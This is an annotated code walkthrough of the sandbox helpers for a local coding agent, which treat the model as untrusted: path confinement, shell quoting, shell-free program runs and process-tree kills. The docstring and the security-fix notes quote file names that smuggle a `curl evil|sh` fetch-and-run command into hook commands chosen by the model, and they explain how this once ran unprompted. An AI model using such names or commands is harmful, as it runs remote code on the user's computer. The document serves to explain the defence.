# `localagent/sandbox.py` — safety helpers

**Role in the flow:** the model is untrusted. Every file path it names passes through `resolve_inside`;
every program it makes us run passes through `run_command`; every long result passes through `truncate`; every file
name pasted into one of your hook commands passes through `quote_for_shell`; and every "look at all files" operation
goes through `walk_files` (never entering folders such as `node_modules` or `.venv`) or, for what the model sees,
`project_files` (which also honours `.gitignore`).

## Module header and `SKIP_DIRS`
```python
  1 | """Safety helpers: keep file access inside the workspace and bound commands.
  2 | 
  3 | The model is untrusted. Every path it names goes through ``resolve_inside`` and
  4 | every program it launches goes through ``run_command``.
  5 | """
  6 | from __future__ import annotations
  7 | 
  8 | import os
  9 | import re
 10 | import shlex
 11 | import signal
 12 | import subprocess
 13 | import sys
 14 | from pathlib import Path
 15 | from typing import Iterator
 16 | 
 17 | # Folders never shown to the model, searched, snapshotted or verified: version control, caches,
 18 | # virtual environments, installed packages, build output, editor state, and the agent's own
 19 | # state folder. A folder can still be opened by naming it (list_files, read_file).
 20 | SKIP_DIRS = frozenset({
 21 |     ".git", ".hg", ".svn", "__pycache__", ".venv", "venv", ".mypy_cache", ".ruff_cache",
 22 |     ".pytest_cache", ".tox", ".nox", ".eggs", ".hypothesis", ".ipynb_checkpoints",
 23 |     "node_modules", "bower_components", ".localagent", "target", "dist", ".next", ".nuxt",
 24 |     ".svelte-kit", ".angular", ".turbo", ".parcel-cache", ".cache", ".gradle", ".dart_tool",
 25 |     ".terraform", ".idea", ".vs", "coverage", "htmlcov", "__pypackages__"})
 26 | SAFE_WORD = re.compile(r"[A-Za-z0-9_./\\:+=-]+")      # needs no quotes in sh or PowerShell
 27 | 
 28 | 
```
- The docstring states the rule. `os` provides `os.walk` and process groups; `re` checks file names; `shlex` quotes
  for `sh`; `signal` stops process groups on Linux/macOS; `subprocess` launches programs; `sys` tells Windows apart;
  `Path` is the path type; `Iterator` types the walkers.
- `SKIP_DIRS` lists folders that are never shown, searched, snapshotted or verified: version control (`.git`, `.hg`,
  `.svn`), Python caches and tools (`__pycache__`, `.mypy_cache`, `.ruff_cache`, `.pytest_cache`, `.tox`, `.nox`,
  `.eggs`, `.hypothesis`, `.ipynb_checkpoints`), virtual environments (`.venv`, `venv`), installed packages
  (`node_modules`, `bower_components`, `__pypackages__`), build output (`target` for Rust and Java, `dist`, `.next`,
  `.nuxt`, `.svelte-kit`, `.angular`, `.turbo`, `.parcel-cache`, `.cache`, `.gradle`, `.dart_tool`, `.terraform`,
  `coverage`, `htmlcov`), editor state (`.idea`, `.vs`) and the agent's own state folder (`.localagent`). Version 0.6
  added the build folders: a Rust project's `target` folder alone holds thousands of files and used to switch `/undo`
  off for the whole project. A skipped folder can still be opened by naming it (`list_files`, `read_file`).
  `build` is deliberately *not* skipped — some projects keep hand-written files there; in a git repository
  `project_files` hides it when `.gitignore` says so.
- `SAFE_WORD` matches file names that need no quotes in either shell (letters, digits, `_ . / \ : + = -`).

## `skip_dir`
```python
 29 | def skip_dir(name: str) -> bool:
 30 |     """True for a folder that is never entered (``SKIP_DIRS`` or Python's ``*.egg-info``)."""
 31 |     return name in SKIP_DIRS or name.endswith(".egg-info")
 32 | 
 33 | 
```
- A folder is skipped when it is in `SKIP_DIRS` or is a Python packaging folder (`*.egg-info`), whose name varies.

## `walk_files`
```python
 34 | def walk_files(root: Path) -> Iterator[Path]:
 35 |     """Every file under ``root`` in sorted order, never entering a skipped folder.
 36 | 
 37 |     Pruning while walking matters on real projects: ``node_modules`` alone can hold
 38 |     100 000 files, which a plain ``rglob`` would visit before filtering them out.
 39 |     """
 40 |     for folder, dirnames, filenames in os.walk(root):
 41 |         dirnames[:] = sorted(d for d in dirnames if not skip_dir(d))   # prune in place
 42 |         for name in sorted(filenames):
 43 |             yield Path(folder) / name
 44 | 
 45 | 
```
- `os.walk` visits one folder at a time and gives the sub-folder names in a list; assigning a filtered list back to
  `dirnames[:]` tells it **not to enter** the skipped ones. That is the speed difference on real projects: a plain
  `rglob("*")` would list all ~100 000 files in a typical `node_modules` before filtering them out.
- Folders and files are sorted, so results are stable (same order every time — good for tests and for the prompt).

## `project_files` — what the model sees
```python
 46 | def _in_git_repo(root: Path) -> bool:
 47 |     """True when ``root`` or a folder above it holds a ``.git`` entry (folder or file)."""
 48 |     return any((folder / ".git").exists() for folder in (root, *root.parents))
 49 | 
 50 | 
```
- True when the folder, or any folder above it, contains `.git` (a folder normally; a *file* in git worktrees and
  submodules). Checking first avoids starting `git` for folders that are not repositories.

```python
 51 | def project_files(root: Path) -> Iterator[Path]:
 52 |     """Like ``walk_files``, but in a git repository the files .gitignore excludes are left out.
 53 | 
 54 |     ``git ls-files`` knows the ignore rules exactly (nested .gitignore files, global
 55 |     excludes), so build output and downloads the project ignores never reach the model.
 56 |     Without git, or outside a repository, every file is walked as usual.
 57 |     """
 58 |     root = root.resolve()
 59 |     listed = None
 60 |     if _in_git_repo(root):
 61 |         try:
 62 |             done = subprocess.run(["git", "-C", str(root), "ls-files", "--cached", "--others",
 63 |                                    "--exclude-standard", "-z"], capture_output=True, timeout=30)
 64 |             listed = done.stdout if done.returncode == 0 else None
 65 |         except (OSError, subprocess.TimeoutExpired):
 66 |             listed = None
 67 |     names = sorted({name for name in (listed or b"").decode("utf-8", "replace").split("\0") if name})
 68 |     if not names:                            # no git, or the whole folder is ignored (e.g. the
 69 |         yield from walk_files(root)          # server's session folders): walk it as usual
 70 |         return
 71 |     for name in names:
 72 |         if any(skip_dir(part) for part in name.split("/")[:-1]):
 73 |             continue
 74 |         path = root / name
 75 |         if path.is_file():                   # --cached also lists files deleted since the commit
 76 |             yield path
 77 | 
 78 | 
```
- In a git repository, asks git for the project's files: `ls-files --cached` (tracked) `--others` (new, not yet added)
  `--exclude-standard` (but not what `.gitignore` excludes), `-z` (names separated by a zero byte, so any file name is
  safe). Git knows every ignore rule exactly — nested `.gitignore` files, your global excludes — so downloads, build
  output and logs that the project ignores never reach the model. On this project that removed 60 llama.cpp DLLs and a
  5 GB model from the file overview.
- Paths inside a skipped folder are still dropped, and so are files `--cached` lists although they were deleted since
  the last commit.
- Falls back to `walk_files` when git is missing, the folder is not a repository, git fails — or git lists nothing at
  all, which happens when the whole folder is ignored (the HTTP server keeps its session workspaces in an ignored
  `sessions/` folder; without the fallback the model would see an empty project).
- Used by the file overview in the prompt, `search` and `outline`. The workspace check and `/undo` keep using
  `walk_files`, because they must also cover files the project ignores.

## `looks_binary`
```python
 79 | def looks_binary(path: Path) -> bool:
 80 |     """True for a file that is not text (a NUL byte early on): images, models, programs."""
 81 |     try:
 82 |         with path.open("rb") as handle:
 83 |             return b"\0" in handle.read(8192)
 84 |     except OSError:
 85 |         return False
 86 | 
 87 | 
```
- Reads the first 8 KB: text files never contain a zero byte, while images, programs and model files almost always do.
  `read_file` refuses such files and `search` skips them — before 0.6, reading a binary file returned thousands of
  garbage characters to the model, and a search over a folder with a 5 GB model file would have loaded it into memory.

## `SandboxError`
```python
 88 | class SandboxError(Exception):
 89 |     """Raised when the model asks for something outside the allowed area."""
 90 | 
 91 | 
```
- Raised when a path escapes the workspace. Tools turn it into an `ERROR:` string for the model.

## `resolve_inside`
```python
 92 | def resolve_inside(root: Path, relative: str) -> Path:
 93 |     """Return the absolute path for ``relative`` or raise if it escapes ``root``."""
 94 |     root = root.resolve()
 95 |     candidate = (root / relative).resolve()  # resolves "..", symlinks, absolute inputs
 96 |     if candidate != root and root not in candidate.parents:
 97 |         raise SandboxError(f"path '{relative}' is outside the workspace")
 98 |     return candidate
 99 | 
100 | 
```
- Makes the workspace root absolute, joins the requested path to it and calls `resolve()`: this collapses `..`,
  follows symlinks, and — if the request was absolute like `C:\Windows` — discards the root entirely, which is
  exactly what the next check catches.
- The result is allowed only if it *is* the root or the root is one of its parent folders; otherwise it raises.

## `truncate`
```python
101 | def truncate(text: str, limit: int) -> str:
102 |     """Shorten long text, keeping the start and the end (errors are usually last)."""
103 |     if len(text) <= limit:
104 |         return text
105 |     head = limit * 2 // 3
106 |     tail = limit - head
107 |     omitted = len(text) - limit
108 |     return f"{text[:head]}\n... [{omitted} characters omitted] ...\n{text[-tail:]}"
109 | 
110 | 
```
- Short text is returned unchanged. Otherwise the head gets two thirds of the budget, the tail the rest, with a marker
  saying how many characters were dropped. Errors and summaries usually appear at the end of output, so keeping the
  tail matters.

## `shell_argv`
```python
111 | def shell_argv(command: str) -> list[str]:
112 |     """How this computer runs one shell command: PowerShell on Windows, ``sh`` elsewhere."""
113 |     if os.name == "nt":
114 |         return ["powershell", "-NoProfile", "-NonInteractive", "-Command", command]
115 |     return ["sh", "-c", command]
116 | 
117 | 
```
- The one place that decides how a shell command runs on this computer: PowerShell (`-NoProfile` = skip your profile
  script, `-NonInteractive` = never wait for typing, `-Command` = run this text) on Windows, `sh -c` elsewhere. Used by
  the host runner (`run_shell` with `--allow-shell`), hooks, your own `!commands` and a `test_command` from the settings.

## `quote_for_shell`
```python
118 | def quote_for_shell(word: str) -> str:
119 |     """``word`` (e.g. a file name) written so the shell of ``shell_argv`` takes it literally.
120 | 
121 |     A file name chosen by the model must never be able to run a command of its own, such as
122 |     ``a$(curl evil).py``; a name starting with ``-`` must never be read as an option.
123 |     """
124 |     if word.startswith("-"):
125 |         word = "./" + word
126 |     if SAFE_WORD.fullmatch(word):
127 |         return word
128 |     if os.name == "nt":                                  # PowerShell: '' is a quote inside '...'
129 |         return "'" + word.replace("'", "''") + "'"
130 |     return shlex.quote(word)
131 | 
132 | 
```
- **A security fix of version 0.6.** Hooks such as `"after_edit": "ruff check {file}"` paste the changed file's name into
  a shell command, and the model chooses file names. A file named `a$(curl evil|sh).py` (perfectly legal on Windows and
  Linux) would have run `curl evil|sh` on your computer, without a question, the moment the model wrote it — this was
  verified with a harmless command before the fix.
- Now the name is quoted: left alone when it contains only safe characters (so ordinary hooks look the same as before);
  otherwise wrapped in single quotes, the one form both shells take completely literally (PowerShell writes a quote
  inside as `''`; `shlex.quote` does the same job for `sh`). A name starting with `-` gets `./` in front, so it is never
  read as an option. Do not put your own quotes around `{file}` in a hook.

## Running programs safely
```python
133 | def kill_tree(process: subprocess.Popen) -> None:
134 |     """Stop a program and every program it started (best effort, never raises)."""
135 |     if sys.platform == "win32":
136 |         try:
137 |             subprocess.run(["taskkill", "/F", "/T", "/PID", str(process.pid)],
138 |                            capture_output=True, timeout=30)
139 |         except (OSError, subprocess.TimeoutExpired):
140 |             pass
141 |     else:
142 |         try:
143 |             os.killpg(process.pid, signal.SIGKILL)      # its own process group (see run_command)
144 |         except OSError:
145 |             pass
146 |     try:
147 |         process.kill()
148 |     except OSError:
149 |         pass
150 | 
151 | 
```
- Stops a program **and every program it started**: on Windows `taskkill /F /T` (force, whole tree), elsewhere a kill
  signal to the program's process group (see `run_command`). Then the program itself, in case. Errors are ignored —
  it may already have ended.

```python
152 | def _leftover_output(process: subprocess.Popen) -> tuple[str, str]:
153 |     """What a killed program printed before it died (empty when its pipes stay blocked)."""
154 |     try:
155 |         out, err = process.communicate(timeout=5)
156 |     except (subprocess.TimeoutExpired, ValueError, OSError):
157 |         return "", ""
158 |     return out or "", err or ""
159 | 
160 | 
```
- After a kill, collects what the program printed before it died (at most 5 more seconds); when even that blocks, it
  gives up with nothing rather than hanging.

```python
161 | def run_command(argv: list[str], cwd: Path, timeout: int, limit: int,
162 |                 input_text: str | None = None) -> tuple[int, str]:
163 |     """Run a program (never through a shell) and return (exit code, output).
164 | 
165 |     The program reads ``input_text`` (or nothing: a program waiting for typing would otherwise
166 |     take the user's keyboard), and it runs in a process group of its own, so a timeout or
167 |     Ctrl+C stops everything it started - a server it launched, a test runner's workers -
168 |     instead of waiting for them forever.
169 |     """
170 |     options: dict = {}
171 |     if sys.platform == "win32":
172 |         options["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
173 |     else:
174 |         options["start_new_session"] = True
175 |     env = {**os.environ, "PYTHONIOENCODING": "utf-8"}   # Python children can print any character
176 |     try:
177 |         process = subprocess.Popen(
178 |             argv, cwd=cwd, env=env, text=True, encoding="utf-8", errors="replace",
179 |             stdin=subprocess.DEVNULL if input_text is None else subprocess.PIPE,
180 |             stdout=subprocess.PIPE, stderr=subprocess.PIPE, **options)
181 |     except FileNotFoundError as exc:
182 |         return 127, f"Command not found: {exc}"
183 |     try:
184 |         out, err = process.communicate(input_text, timeout=timeout)
185 |     except subprocess.TimeoutExpired:
186 |         kill_tree(process)
187 |         out, err = _leftover_output(process)
188 |         report = f"Command timed out after {timeout}s and was killed.\n{out}{err}".strip()
189 |         return 124, truncate(report, limit)
190 |     except KeyboardInterrupt:
191 |         kill_tree(process)
192 |         raise
193 |     return process.returncode, truncate((out or "") + (err or ""), limit)
```
- Takes a list `argv` (program + arguments), the folder to run in, a timeout, an output cap and optional input text.
- **Never through a shell** (a list, never `shell=True`), so nothing in the arguments is interpreted.
- **No keyboard.** Without `input_text` the program's input is empty (`DEVNULL`). Before 0.6 a program that asked a
  question (`input()`) read from *your* terminal: the agent seemed frozen until the timeout, and your typing went to
  the program. Now `input()` fails at once with `EOFError`, which the model can read and fix. `input_text` is used by
  the Rust checker, which reads the file from its input.
- **A process group of its own** (`CREATE_NEW_PROCESS_GROUP` on Windows, `start_new_session` elsewhere), so a timeout
  or Ctrl+C can stop everything the program started. Before 0.6 a timeout killed only the program itself; a server or
  worker it had started kept the output pipe open and Python waited for it — measured: a 3-second timeout returned
  after 25 seconds, and a model-written server would have hung the agent forever. Now: 3.2 seconds.
- `PYTHONIOENCODING=utf-8` lets Python programs print any character: on Windows a program printing ✓ into a pipe
  otherwise crashes with `UnicodeEncodeError` — a false failure caused by the pipe, not by the code.
- On timeout the tree is killed and exit code 124 (the `timeout` convention) is returned **with whatever the program
  printed before** (often the useful part, e.g. "listening on port 8000"); program not found → 127. On Ctrl+C the tree
  is killed and the interrupt continues. Otherwise the exit code and the output (standard output first, then errors),
  truncated.

> Note: this limits *where* files are touched and *how long* programs run, but a program run on your machine can still
> do anything your user account can. That is why `tools.py` asks for approval before running anything, and why
> `--sandbox docker` exists (see `runners.md`).
